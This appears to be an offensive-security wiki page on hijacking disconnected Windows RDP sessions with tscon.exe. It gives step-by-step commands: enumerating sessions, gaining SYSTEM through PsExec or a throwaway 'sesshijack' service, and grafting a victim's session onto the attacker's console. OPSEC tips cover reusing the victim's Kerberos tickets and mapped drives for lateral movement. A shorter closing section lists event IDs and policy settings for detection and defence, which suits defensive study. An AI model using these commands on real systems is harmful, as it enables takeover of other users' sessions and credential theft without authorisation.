---
title: RDP Session Hijack via tscon
slug: rdp-session-hijack-tsmuxd
---

> **TL;DR:** As SYSTEM, run `tscon <victim_session_id> /dest:<your_session>` and you are dropped into the victim's disconnected RDP session — no password, no MFA, no prompt. The Terminal Services session manager treats SYSTEM as authorised to switch any session anywhere.

## What it is
`tscon.exe` is the built-in client of the Terminal Services / Remote Desktop Services session manager (`termsrv`, historically referred to as `tsmuxd`). It asks `termsrv` to connect a session ID to a target console or RDP listener. The session manager only checks that the *caller* has the right to perform the switch — and SYSTEM does, for every session on the box. Disconnected RDP sessions persist across reboots-of-the-client (not server), so admin sessions left in "Disconnected" state are a free lateral-movement hop once you have SYSTEM on the jump host.

## Preconditions / where it applies
- SYSTEM on the target (obtain via `PsExec -s`, scheduled task running as SYSTEM, or a service you create)
- At least one other interactive / RDP session in `Disc` (disconnected) or `Active` state
- Works on every Windows version that ships RDS (client and server SKUs); not mitigated by NLA or smart-card logon — those gate the *initial* logon, not session reconnection

## Technique
Enumerate sessions, become SYSTEM, then call `tscon`. Easiest SYSTEM trick is creating a one-shot service that launches `tscon` for you so the process token is truly SYSTEM.

```cmd
:: 1. who is here?
query user
::  USERNAME              SESSIONNAME    ID  STATE
::  alice                                 2  Disc
::  bob       rdp-tcp#7                   3  Active

:: 2. become SYSTEM (any path you like)
PsExec.exe -accepteula -s -i cmd.exe

:: 3. graft alice's session onto your console / your RDP session
tscon 2 /dest:console
::  or, from a remote RDP session, /dest:rdp-tcp#<your_id>

:: service trick variant — no PsExec needed
sc create sesshijack binpath= "cmd /c tscon 2 /dest:rdp-tcp#7"
sc start sesshijack
```

OPSEC: the victim's session disappears from their endpoint if they were still connected (rare for `Disc` targets). You inherit their loaded profile, Kerberos tickets and any mapped drives — handy for chaining to [[kerberos]] abuses without dumping credentials.

## Detection and defence
- Security 4778 (session reconnected) / 4779 (disconnected) where the `Account Name` does not match the `LogonID` owner
- Sysmon EID 1 on `tscon.exe` with parent `services.exe` or `PsExec`-spawned shells running as SYSTEM
- Set GPO **"Set time limit for disconnected sessions"** to forcibly log off disconnected RDP — removes the target
- Restrict SYSTEM-spawning paths: limit local admins, monitor service creation (4697 / Sysmon EID 1 `sc.exe create`)

## References
- [ired.team — RDP Hijacking with tscon](https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement) — original walkthrough
- [Alexander Korznikov — RDP session hijacking with tscon](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) — original 2017 disclosure
- [MITRE ATT&CK T1563.002](https://attack.mitre.org/techniques/T1563/002/) — RDP hijacking mapping

Related: [[tokens-and-privileges]], [[token-impersonation]], [[kerberos]]
